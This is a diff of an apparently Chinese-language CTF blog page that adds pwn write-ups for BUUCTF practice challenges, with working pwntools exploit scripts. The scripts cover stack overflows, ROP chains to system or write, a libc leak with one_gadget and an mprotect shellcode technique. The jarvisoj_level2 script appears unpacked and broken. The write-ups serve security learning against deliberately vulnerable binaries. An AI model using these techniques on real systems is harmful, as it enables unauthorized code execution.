-<p><img src="buuctf-pwn1.assets/image-20200730154608035.png" alt="image-20200730154608035"></p>
+<p><img src="image-20200730154608035.png" alt="image-20200730154608035"></p>
 <p>发现开启了NX，不过这里开了NX也影响不大，毕竟二进制程序本身就包含了读文件的函数，直接跳转过去执行就可以了</p>
 <p>TextView里面看一下<code>get_flag</code>的地址偏移</p>
-<p><img src="buuctf-pwn1.assets/image-20200730154806723.png" alt="image-20200730154806723"></p>
+<p><img src="image-20200730154806723.png" alt="image-20200730154806723"></p>
 <p>按着这个思路本来写了这样的一个payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(<span class="number">0x80489a0</span>)</span><br></pre></td></tr></table></figure>
 
@@ -525,11 +546,11 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0x80489b8</span>)</span><br></pre></td></tr></table></figure>
 
 <p>这样会直接跳到两个条件判断之后，就可以读出来flag的内容了</p>
-<p><img src="buuctf-pwn1.assets/image-20200731111433918.png" alt="image-20200731111433918"></p>
+<p><img src="image-20200731111433918.png" alt="image-20200731111433918"></p>
 <p>但是这样的程序其实是存在问题的，因为直接跳转到了flag函数的内部，会导致栈帧不平衡</p>
 <p>看了网上的一些方法之后，其实还有更好的办法</p>
 <p>函数表中存在一个<code>mprotect</code>函数</p>
-<p><img src="buuctf-pwn1.assets/image-20200731120253306.png" alt="image-20200731120253306"></p>
+<p><img src="image-20200731120253306.png" alt="image-20200731120253306"></p>
 <p>这个函数作用是修改用户态内存段的权限</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
 
@@ -544,14 +565,14 @@
 <p>程序函数表中引入了这个函数，就可以首先用这个函数修改bss段中的一部分为可执行，之后用read函数写入shellode，最后再跳转到shellcode</p>
 <p>指定的内存大小至少要是一个内存页(4k)，并且起始位置也必须是一个内存页的开始位置</p>
 <p>首先可以看一下进程的内存空间，将进程后台运行后直接查看<code>/proc/pid/maps</code>，这里会写出来进程内存空间的权限和起始地址</p>
-<p><img src="buuctf-pwn1.assets/image-20200731121934216.png" alt="image-20200731121934216"></p>
+<p><img src="image-20200731121934216.png" alt="image-20200731121934216"></p>
 <p>图例可以看到进程在<code>80ea000</code>到<code>80ec000</code>的区域是可以读写的，并且属于进程自己的空间</p>
 <p>所以我们可以选这里的中间，<code>80eb000</code>这里开始，增加一段具有执行权限的区域，想要执行的语句应该是</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(<span class="number">0x80eb000</span>,<span class="number">0x1000</span>,<span class="number">7</span>);</span><br></pre></td></tr></table></figure>
 
 <p>这条指令之后，从<code>0x80eb000</code>这里到<code>0x80ed000</code>这一段内存就变成了可读可写可执行的权限，下面就需要向其中写入shellcode</p>
 <p>调用mprotect这里函数结束之后，下面想要调用read函数，但是这时堆栈中mprotect的三个参数就占了位置，所以需要pop出来3个参数，调整堆栈，使得read函数的地址在栈顶，这样就可以直接用ret跳转到read函数的位置，所以用ROPGadget再搜索一下三个pop的gadget</p>
-<p><img src="buuctf-pwn1.assets/image-20200731190353655.png" alt="image-20200731190353655"></p>
+<p><img src="image-20200731190353655.png" alt="image-20200731190353655"></p>
 <p>得到这样的一条指令。下面payload就需要调用mprotect，并且平衡堆栈</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect) + p32(pop3) + p32(arg1) + p32(arg2) + p32(arg3)</span><br></pre></td></tr></table></figure>
 
@@ -571,20 +592,115 @@
 
 
 <h2 id="第五空间2019决赛PWN5"><a href="#第五空间2019决赛PWN5" class="headerlink" title="第五空间2019决赛PWN5"></a>第五空间2019决赛PWN5</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>查看程序的安全机制</p>
-<p><img src="buuctf-pwn1.assets/image-20200907171415275.png" alt="image-20200907171415275"></p>
+<p><img src="buuctf-pwn1/image-20200907171415275.png" alt="image-20200907171415275"></p>
 <p>安全机制开启了好几个，除了PIE都开了</p>
 <p>IDA反汇编查看main函数</p>
-<p><img src="buuctf-pwn1.assets/image-20200907171504354.png" alt="image-20200907171504354"></p>
+<p><img src="buuctf-pwn1/image-20200907171504354.png" alt="image-20200907171504354"></p>
 <p>设置了个随机数，读入两个输入，并和其进行比较，如果输入的pass和随机数相等则调用<code>/bin/sh</code></p>
 <p>这里两个输入都进行了长度限制，不存在直接溢出的问题</p>
 <p>但是看到在printf密码之前，有一个<code>printf(&amp;buf)</code>的语句</p>
 <p>尝试运行输入很长的内容，可以看到输入出现了一些问题，因此可能是格式化字符串的漏洞</p>
-<p><img src="buuctf-pwn1.assets/image-20200907171852085.png" alt="image-20200907171852085"></p>
+<p><img src="buuctf-pwn1/image-20200907171852085.png" alt="image-20200907171852085"></p>
 <p>根据上面代码的思路，首先用格式化字符串漏洞打印出<code>unk_804C044</code>缓冲区中数字的值</p>
 <p>之后再输入密码的时候输入这个数字就可以了</p>
 <p>那么这里需要涉及到的问题就是格式化字符串漏洞的任意地址读问题</p>
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>输入<code>aaaa</code>以及若干个<code>%x</code>，可以根据输出中<code>aaaa</code>字符出现的偏移确定buf和栈帧的距离</p>
-<p><img src="buuctf-pwn1.assets/image-20200907172756891.png" alt="image-20200907172756891"></p>
+<p><img src="buuctf-pwn1/image-20200907172756891.png" alt="image-20200907172756891"></p>
+<h2 id="Jarvisoj-level0"><a href="#Jarvisoj-level0" class="headerlink" title="Jarvisoj_level0"></a>Jarvisoj_level0</h2><p>这道题就是一个很基础的pwn，溢出之后直接覆盖返回地址为get_flag的地址就可以</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./level0&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28376</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>首先检查安全机制</p>
+<p><img src="image-20201101105215030.png" alt="image-20201101105215030"></p>
+<p>开启了NX；</p>
+<p>运行一下，发现是一个需要输入用户名</p>
+<p>查找对system函数的调用，可以发现存在一个后门函数dl_registery</p>
+<p><img src="image-20201101105611971.png" alt="image-20201101105611971"></p>
+<p>main函数中对输入的name做了一个检查</p>
+<p><img src="image-20201101105649086.png" alt="image-20201101105649086"></p>
+<p>这里的name_check应该是一个长度检查的函数</p>
+<p><img src="image-20201101105733721.png" alt="image-20201101105733721"></p>
+<p>按说输入的name长度在4-8之间就可以通过，但是试了之后发现并不可以；</p>
+<p>主要原因在于这个检查是和unsigned int比较的；</p>
+<p>所以实际上这里输入的数字很大时可以绕过，因为v3是一个unsigned int8，所以最大255</p>
+<p>这里要求4-8，所以可以用长度在255+4-255+8之间绕过，这样最低的8位是满足要求的</p>
+<p>最后看返回的地方，是将可控的缓冲区s用strcpy复制到了dest这个地方；</p>
+<p>这里距离堆栈还有0x11的距离，之后加上ebp的4个字节，一共需要填充0x15字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./r2t3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x11</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload = payload + p32(<span class="number">0x0804858b</span>)</span><br><span class="line">payload = payload + (<span class="number">255</span>+<span class="number">5</span>-len(payload))*<span class="string">&#x27;c&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one gadget"></a>[BJDCTF 2nd]one gadget</h2><p>程序是64位的，首先checksec</p>
+<p><img src="image-20201101141818205.png" alt="image-20201101141818205"></p>
+<p>运行一下之后首先有一个说<code>here is a gift for u</code></p>
+<p>这里直接输出了printf的地址，拿这个地址可以去查到libc的基地址和版本</p>
+<p><img src="image-20201101142701814.png" alt="image-20201101142701814"></p>
+<p>之后要求输入一个<code>gadget</code></p>
+<p><img src="image-20201101142126563.png" alt="image-20201101142126563"></p>
+<p>在程序的函数中可以看到</p>
+<p><img src="image-20201101142037053.png" alt="image-20201101142037053"></p>
+<p>直接就是跳到了这个gadget的位置</p>
+<p>那么思路就是，通过printf的地址计算出libc的基地址；</p>
+<p>之后用one_gadget搜索其中的system或execve，直接把gadget输入给程序</p>
+<p><img src="image-20201102162750820.png" alt="image-20201102162750820"></p>
+<p>测试后最后一个gadget是可以正常执行的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26587</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./one_gadget&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_offset = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27; u:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = int(io.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - printf_offset</span><br><span class="line">gadget = <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">io.sendline(str(libc_base+gadget)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>执行一下的效果</p>
+<p><img src="image-20201102171957552.png" alt="image-20201102171957552"></p>
+<p>是一个输入名字的程序</p>
+<p>安全机制基本都开了</p>
+<p><img src="image-20201102172023608.png" alt="image-20201102172023608"></p>
+<p>查看main函数，可以看到进行了一个判断，如果打到了这个点就会执行bin/sh</p>
+<p><img src="image-20201102172124594.png" alt="image-20201102172124594"></p>
+<p>但是我们输入<code>aaa</code>显然连那个大的判断if都没有进入</p>
+<p>这里观察一下其实就是让输入的<code>var[13]</code>不为0</p>
+<p>Var的长度超过14就可以，而调用了system的那个小if则是判断<code>var[13]</code>是否等于17</p>
+<p>只是要注意这里var是当作QWORD读的</p>
+<p>QWORD是4个字节，也就是说13*4+1的位置要是17</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_2019&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">13</span>*<span class="number">4</span>+p64(<span class="number">17</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>检查安全机制</p>
+<p><img src="image-20201102192917583.png" alt="image-20201102192917583"></p>
+<p>只开启了NX</p>
+<p>main函数主要是一个gets输入</p>
+<p><img src="image-20201102193648677.png" alt="image-20201102193648677"></p>
+<p>看到这个v4和ebp存在0x2d的距离</p>
+<p>搜索字符串发现有一个<code>flag.txt</code></p>
+<p>查找reference找到这样一个<code>get_secret</code>函数</p>
+<p><img src="image-20201102193257668.png" alt="image-20201102193257668"></p>
+<p>这个函数首先打开了文件<code>flag.txt</code>，之后用<code>fgets</code>从<code>v0</code>句柄读内容到<code>fl4g</code>这段内存空间</p>
+<p><code>fl4g</code>位于bss段</p>
+<p><img src="image-20201102201744573.png" alt="image-20201102201744573"></p>
+<p>有了这些内容，我们想要构造的应该就是这样一个调用链：首先溢出控制返回地址，覆盖返回地址填写为<code>get_secret</code>函数，这个函数执行完毕之后会在bss段<code>fl4g</code>处写入<code>flag.txt</code>的内容；</p>
+<p>之后利用rop调用write函数读出来这个地方的值；</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25072</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line"></span><br><span class="line">get_secret = <span class="number">0x080489a0</span></span><br><span class="line">bss = <span class="number">0x080eca2d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span> + p32(get_secret) + p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(bss) + p32(<span class="number">1</span>) + p32(bss) + p32(<span class="number">45</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>和之前那道题目类似，这个题目也存在另一种解法</p>
+<p>就是使用mprotect修改bss段的权限，之后再跳转到写在bss段的shellcode</p>
+<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>首先查安全机制和架构</p>
+<p><img src="image-20201102204244975.png" alt="image-20201102204244975"></p>
+<p>运行一下效果就是输入一个字符串</p>
+<p><img src="image-20201102204313538.png" alt="image-20201102204313538"></p>
+<p>main函数的代码</p>
+<p><img src="image-20201102204414050.png" alt="image-20201102204414050"></p>
+<p>vulnerable 函数中的代码</p>
+<p><img src="image-20201102204442374.png" alt="image-20201102204442374"></p>
+<p>read了0x100，但是距离ebp只有0x88</p>
+<p>由于开启了nx，应该也是用rop来做了</p>
+<p>直接溢出，rop跳到system</p>
+<p><img src="image-20201102204549168.png" alt="image-20201102204549168"></p>
+<p>查找字符串还发现很贴心的给了<code>/bin/sh</code></p>
+<p>虽然这个字符串并没有调用的地方</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io  = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span> + elf.sym[<span class="string">&#x27;system&#x27;</span>] + elf.sym[<span class="string">&#x27;main&#x27;</span>] + elf.sym[<span class="string">&#x27;hint&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.readline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -670,7 +786,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RIP"><span class="nav-number">1.</span> <span class="nav-text">RIP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup-csaw-2016"><span class="nav-number">2.</span> <span class="nav-text">warmup_csaw_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-sctf-2016"><span class="nav-number">3.</span> <span class="nav-text">pwn1_sctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">4.</span> <span class="nav-text">ciscn_2019_n_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">5.</span> <span class="nav-text">ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload%E7%BC%96%E5%86%99"><span class="nav-number">5.2.</span> <span class="nav-text">payload编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyrop"><span class="nav-number">6.</span> <span class="nav-text">babyrop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">6.1.</span> <span class="nav-text">基本分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99payload"><span class="nav-number">6.2.</span> <span class="nav-text">编写payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BAsub-804871f"><span class="nav-number">6.2.1.</span> <span class="nav-text">溢出sub_804871f</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E5%BE%97%E5%88%B0write%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">6.2.2.</span> <span class="nav-text">溢出得到write真实地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E5%BE%97%E5%88%B0shell"><span class="nav-number">6.2.3.</span> <span class="nav-text">溢出得到shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-en-2"><span class="nav-number">7.</span> <span class="nav-text">ciscn_2019_en_2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90-1"><span class="nav-number">7.1.</span> <span class="nav-text">基本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">8.</span> <span class="nav-text">get_started_3dsctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90-2"><span class="nav-number">8.1.</span> <span class="nav-text">基本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9BPWN5"><span class="nav-number">9.</span> <span class="nav-text">第五空间2019决赛PWN5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">9.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">9.2.</span> <span class="nav-text">利用</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RIP"><span class="nav-number">1.</span> <span class="nav-text">RIP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup-csaw-2016"><span class="nav-number">2.</span> <span class="nav-text">warmup_csaw_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-sctf-2016"><span class="nav-number">3.</span> <span class="nav-text">pwn1_sctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">4.</span> <span class="nav-text">ciscn_2019_n_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">5.</span> <span class="nav-text">ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload%E7%BC%96%E5%86%99"><span class="nav-number">5.2.</span> <span class="nav-text">payload编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyrop"><span class="nav-number">6.</span> <span class="nav-text">babyrop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">6.1.</span> <span class="nav-text">基本分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99payload"><span class="nav-number">6.2.</span> <span class="nav-text">编写payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BAsub-804871f"><span class="nav-number">6.2.1.</span> <span class="nav-text">溢出sub_804871f</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E5%BE%97%E5%88%B0write%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">6.2.2.</span> <span class="nav-text">溢出得到write真实地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E5%BE%97%E5%88%B0shell"><span class="nav-number">6.2.3.</span> <span class="nav-text">溢出得到shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-en-2"><span class="nav-number">7.</span> <span class="nav-text">ciscn_2019_en_2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90-1"><span class="nav-number">7.1.</span> <span class="nav-text">基本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">8.</span> <span class="nav-text">get_started_3dsctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90-2"><span class="nav-number">8.1.</span> <span class="nav-text">基本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9BPWN5"><span class="nav-number">9.</span> <span class="nav-text">第五空间2019决赛PWN5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">9.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">9.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jarvisoj-level0"><span class="nav-number">10.</span> <span class="nav-text">Jarvisoj_level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-r2t3"><span class="nav-number">11.</span> <span class="nav-text">[BJDCTF 2nd]r2t3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-one-gadget"><span class="nav-number">12.</span> <span class="nav-text">[BJDCTF 2nd]one gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">13.</span> <span class="nav-text">ciscn_2019_n_8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#not-the-same-3dsctf-2016"><span class="nav-number">14.</span> <span class="nav-text">not_the_same_3dsctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2"><span class="nav-number">15.</span> <span class="nav-text">jarvisoj_level2</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -686,7 +802,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">88</span>
+          <span class="site-state-item-count">89</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
